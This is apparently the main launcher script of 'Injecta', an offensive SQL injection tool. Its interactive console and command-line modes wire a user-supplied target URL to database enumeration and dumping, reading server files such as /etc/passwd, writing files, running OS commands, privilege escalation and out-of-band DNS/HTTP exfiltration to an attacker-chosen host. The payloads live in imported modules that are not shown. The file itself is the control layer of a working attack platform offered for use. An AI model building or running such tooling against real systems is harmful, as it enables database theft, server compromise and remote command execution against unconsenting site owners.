#!/usr/bin/env python3
"""
Injecta — Full-stack SQL injection platform.
Usage: python run.py -u "http://target.com/page.php?id=1"
       python run.py -u "http://target.com/page.php?id=1" --dbs
       python run.py -u "http://target.com/page.php?id=1" --file-read /etc/passwd
       python run.py --web                        # Launch web dashboard
       python run.py --interactive                # Launch interactive console
"""
import sys
import os
import shlex

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from injecta.core.config import parse_args
from injecta.core.logger import VoidLogger
from injecta.core.engine import ScanEngine
from injecta.core.web import start_web_server
from injecta.enum.fileio import FileIO
from injecta.enum.privesc import PrivilegeEscalation
from injecta.enum.oob import OOBExfiltrator
from injecta.enum.report import ReportGenerator
from injecta.techniques.nosql import NoSQLDetector
from injecta.techniques.graphql import GraphQLInjector
from injecta.core.requester import VoidRequester
from injecta.enum.blind import BlindOptimizer
from injecta.enum.cms import CMSFingerprinter
from injecta.techniques.second_order import SecondOrderInjector
from injecta.techniques.websocket import WebSocketScanner
from injecta.plugins.loader import PluginLoader
from injecta.payloads.mysql import MySQLPayloads
from injecta.payloads.postgresql import PostgreSQLPayloads
from injecta.payloads.mssql import MSSQLPayloads
from injecta.payloads.oracle import OraclePayloads
from injecta.payloads.sqlite import SQLitePayloads


PAYLOAD_REGISTRY = {
    "mysql": MySQLPayloads, "postgresql": PostgreSQLPayloads,
    "mssql": MSSQLPayloads, "oracle": OraclePayloads, "sqlite": SQLitePayloads,
}


def interactive_mode(config, logger):
    engine = None
    last_target = ""

    print()
    logger.info("Injecta Interactive Console")
    logger.info("Type 'help' for commands, 'exit' to quit.")
    print()

    while True:
        try:
            line = input("injecta> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            logger.info("Exiting interactive mode.")
            break

        if not line:
            continue

        parts = shlex.split(line)
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd in ("exit", "quit"):
            logger.info("Exiting interactive mode.")
            break

        elif cmd == "help":
            _print_help()

        elif cmd == "url":
            if args:
                last_target = args[0]
                logger.ok(f"Target set: {last_target}")
            else:
                logger.info(f"Current target: {last_target or '(not set)'}")

        elif cmd == "run":
            if not last_target:
                logger.error("No target set. Use 'url <target>' first.")
                continue
            cfg = config
            cfg.target = last_target
            engine = ScanEngine(cfg, logger)
            engine.run(last_target)

        elif cmd == "dbs" or cmd == "databases":
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            engine._enum_databases(last_target, engine.injection_info.get("param", ""))

        elif cmd == "tables":
            db = args[0] if args else (config.db or "")
            if not db:
                logger.error("Specify database: tables <dbname>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            engine._enum_tables(last_target, engine.injection_info.get("param", ""), db)

        elif cmd == "columns" or cmd == "cols":
            if len(args) < 2:
                logger.error("Usage: columns <db> <table>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            engine._enum_columns(last_target, engine.injection_info.get("param", ""), args[0], args[1])

        elif cmd == "dump":
            if len(args) < 3:
                logger.error("Usage: dump <db> <table> <column>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            engine._dump_data(last_target, engine.injection_info.get("param", ""), args[0], args[1], args[2])

        elif cmd == "file-read" or cmd == "cat":
            if not args:
                logger.error("Usage: file-read <path>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            io = FileIO(engine.req, config, logger, engine.payloads, engine.injection_info)
            results = io.read_file(last_target, engine.injection_info.get("param", ""), args[0])
            if results:
                logger.result(f"File: {args[0]}")
                for line in results:
                    logger.raw(f"  {line}")

        elif cmd == "file-write" or cmd == "write":
            if len(args) < 2:
                logger.error("Usage: file-write <path> <content>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            io = FileIO(engine.req, config, logger, engine.payloads, engine.injection_info)
            ok = io.write_file(last_target, engine.injection_info.get("param", ""), args[0], " ".join(args[1:]))
            if ok:
                logger.ok(f"Written to {args[0]}")
            else:
                logger.error(f"Failed to write {args[0]}")

        elif cmd == "os-cmd" or cmd == "exec" or cmd == "!":
            cmd_str = " ".join(args)
            if not cmd_str:
                logger.error("Usage: os-cmd <command>")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            io = FileIO(engine.req, config, logger, engine.payloads, engine.injection_info)
            results = io.os_cmd(last_target, engine.injection_info.get("param", ""), cmd_str)
            if results:
                logger.result(f"Output:")
                for line in results:
                    logger.raw(f"  {line}")

        elif cmd == "nosql":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            req = VoidRequester(config)
            detector = NoSQLDetector(req, config, logger)
            result = detector.scan(last_target)
            if result.get("vulnerable"):
                logger.warn("NoSQL injection confirmed!")
            else:
                logger.info(f"NoSQL: detected={result.get('detected')}, db={result.get('db_type')}")

        elif cmd == "graphql":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            req = VoidRequester(config)
            injector = GraphQLInjector(req, config, logger)
            result = injector.discover(last_target)
            if result.get("found"):
                for ep in result.get("endpoints", []):
                    inj = injector.test_injection(ep)
                    if inj.get("vulnerable"):
                        logger.warn(f"GraphQL injection on {ep}")

        elif cmd == "privesc" or cmd == "privileges":
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            pe = PrivilegeEscalation(engine.req, config, logger, engine.payloads, engine.injection_info)
            result = pe.enumerate_privileges(last_target, engine.injection_info.get("param", ""))
            if not result.get("is_admin"):
                logger.info("Attempting escalation...")
                esc = pe.attempt_escalation(last_target, engine.injection_info.get("param", ""))
                if esc.get("success"):
                    logger.ok(f"Escalated via {esc['technique']}")

        elif cmd == "oob" or cmd == "exfil":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            if not engine or not engine.injection_info:
                logger.error("Run a scan first.")
                continue
            host = args[0] if args else config.oob_host
            if not host:
                logger.error("Usage: oob <host>")
                continue
            channel = args[1] if len(args) > 1 else "dns"
            oob = OOBExfiltrator(engine.req, config, logger, engine.payloads, engine.injection_info)
            r = oob.exfiltrate(last_target, engine.injection_info.get("param", ""), "SELECT 1", host, channel)
            if r.get("success"):
                logger.ok(f"OOB {channel.upper()} channel established to {host}")
            else:
                logger.error(f"OOB {channel.upper()} failed: {r.get('error')}")

        elif cmd == "report":
            if not engine:
                logger.error("Run a scan first.")
                continue
            rg = ReportGenerator(config, logger)
            data = {
                "target": last_target,
                "dbms": engine.dbms or "unknown",
                "waf": engine.waf.detected_wafs if engine.waf else [],
                "params": engine.vulnerable_params,
                "privesc": getattr(engine, "privesc_result", {}),
                "timestamp": __import__("time").strftime("%Y-%m-%d %H:%M:%S"),
                "tool": "Injecta Intelligence Platform",
                "team": "Kael / Krynn Team",
            }
            paths = rg.generate_all(data)
            logger.ok(f"JSON: {paths['json']}")
            logger.ok(f"HTML: {paths['html']}")

        elif cmd == "cms":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            fp = CMSFingerprinter(VoidRequester(config), config, logger)
            result = fp.scan(last_target)
            if result.get("detected"):
                logger.result(f"CMS: {result['cms']} v{result.get('version', '?')}")
                for e in result.get("exploits", []):
                    logger.raw(f"  -> {e}")

        elif cmd == "second-order" or cmd == "so":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            so = SecondOrderInjector(VoidRequester(config), config, logger)
            result = so.scan(last_target)
            if result.get("vulnerable"):
                logger.warn("Second-order injection confirmed!")
            else:
                logger.info("No second-order injection detected")

        elif cmd == "ws" or cmd == "websocket":
            if not last_target:
                logger.error("Set a target first with 'url <target>'")
                continue
            wss = WebSocketScanner(VoidRequester(config), config, logger)
            result = wss.scan(last_target)
            if result.get("found"):
                logger.info(f"WebSocket endpoints: {len(result['endpoints'])}")
                for ep in result["endpoints"]:
                    logger.raw(f"  {ep}")

        elif cmd == "plugins":
            pl = PluginLoader(config, logger)
            found = pl.discover()
            if found:
                logger.info(f"Plugins found: {len(found)}")
                for p in found:
                    logger.raw(f"  {p}")
                loaded = pl.load_all()
                logger.ok(f"Loaded {len(loaded)} plugin(s)")
            else:
                logger.info("No plugins found in plugins/ directory")

        elif cmd == "info" or cmd == "status":
            logger.info(f"Target: {last_target or '(not set)'}")
            if engine:
                logger.info(f"DBMS: {engine.dbms or '(unknown)'}")
                logger.info(f"Vulnerable: {len(engine.vulnerable_params)} parameter(s)")
                for v in engine.vulnerable_params:
                    logger.raw(f"  {v.get('param')} -> {v.get('technique')} (confidence: {v.get('confidence', 0)})")
            else:
                logger.info("No scan data. Run a scan first.")

        elif cmd == "clear" or cmd == "cls":
            os.system("cls" if os.name == "nt" else "clear")

        elif cmd == "scan":
            if not last_target:
                logger.error("No target set. Use 'url <target>' first.")
                continue
            cfg = config
            cfg.target = last_target
            engine = ScanEngine(cfg, logger)
            engine.run(last_target)

        else:
            logger.warn(f"Unknown command: {cmd}. Type 'help' for available commands.")


def _print_help():
    print()
    print("  Commands:")
    print("  url <target>         Set target URL")
    print("  run / scan           Execute SQL injection scan")
    print("  dbs / databases      List databases")
    print("  tables <db>          List tables in database")
    print("  columns <db> <tbl>   List columns in table")
    print("  dump <db> <tbl> <col>  Dump column data")
    print("  file-read <path>     Read file from server")
    print("  file-write <path> <content>  Write file to server")
    print("  os-cmd <cmd> / !<cmd>  Execute OS command")
    print("  nosql                Test NoSQL injection")
    print("  graphql              Test GraphQL endpoints")
    print("  privesc / privileges Check & escalate privileges")
    print("  oob <host> [dns|http] OOB data exfiltration test")
    print("  report               Generate HTML+JSON report")
    print("  cms                  Fingerprint CMS (WordPress, Joomla, Drupal...)")
    print("  second-order / so    Test second-order SQL injection")
    print("  ws / websocket       Scan WebSocket endpoints")
    print("  plugins              List and load custom payload plugins")
    print("  info / status        Show current target & scan status")
    print("  clear / cls          Clear screen")
    print("  help                 Show this help")
    print("  exit / quit          Exit interactive mode")
    print()


def main():
    config = parse_args()
    logger = VoidLogger(verbose=config.verbose, no_color=config.no_color)

    if config.web_mode or config.api_mode:
        start_web_server(config, logger)
        return

    if config.interactive:
        interactive_mode(config, logger)
        return

    if not config.target:
        logger.error("No target specified. Use -u <url>, --web, or --interactive.")
        logger.raw("")
        logger.raw("Usage:")
        logger.raw("  python run.py -u \"http://target.com/page.php?id=1\"")
        logger.raw("  python run.py -u \"http://target.com/page.php?id=1\" --dbs")
        logger.raw("  python run.py --web")
        logger.raw("  python run.py --interactive")
        sys.exit(1)

    engine = ScanEngine(config, logger)
    engine.run(config.target)


if __name__ == "__main__":
    main()
